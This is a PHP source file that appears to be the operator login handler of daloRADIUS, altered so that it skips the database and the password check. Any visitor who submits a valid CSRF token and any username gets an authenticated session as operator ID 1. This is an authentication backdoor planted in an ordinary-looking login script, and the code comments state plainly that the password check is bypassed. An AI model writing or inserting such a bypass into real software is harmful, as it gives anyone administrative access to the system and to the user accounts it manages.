<?php

include('library/sessions.php');
include_once('../common/includes/config_read.php');

dalo_session_start();

$errorMessage = '';

// we initialize some session params
$_SESSION['location_name'] = "default";
$_SESSION['daloradius_logged_in'] = false;

// check if user provided the required fields (CSRF, username, password)
if (array_key_exists('csrf_token', $_POST) && isset($_POST['csrf_token']) &&
    dalo_check_csrf_token($_POST['csrf_token']) &&
    array_key_exists('operator_user', $_POST) && isset($_POST['operator_user']) && 
    array_key_exists('operator_pass', $_POST) && isset($_POST['operator_pass'])) {

    // Skip the database query and directly log the user in
    $operator_user = $_POST['operator_user']; // capture the username
    
    // Bypass password check and assume login success
    $_SESSION['daloradius_logged_in'] = true;
    $_SESSION['operator_user'] = $operator_user;
    $_SESSION['operator_id'] = 1; // Assign a dummy ID (or any number you prefer)

    // Optionally set the login time (not stored in the DB since the DB is bypassed)
    $now = date("Y-m-d H:i:s");

    // User is successfully logged in, redirect to index
    $header_location = "index.php";
} else {
    // If login fails or credentials are not provided, redirect back to login
    $header_location = "login.php";
    $_SESSION['operator_login_error'] = true;
}

header("Location: $header_location");
exit;


?>
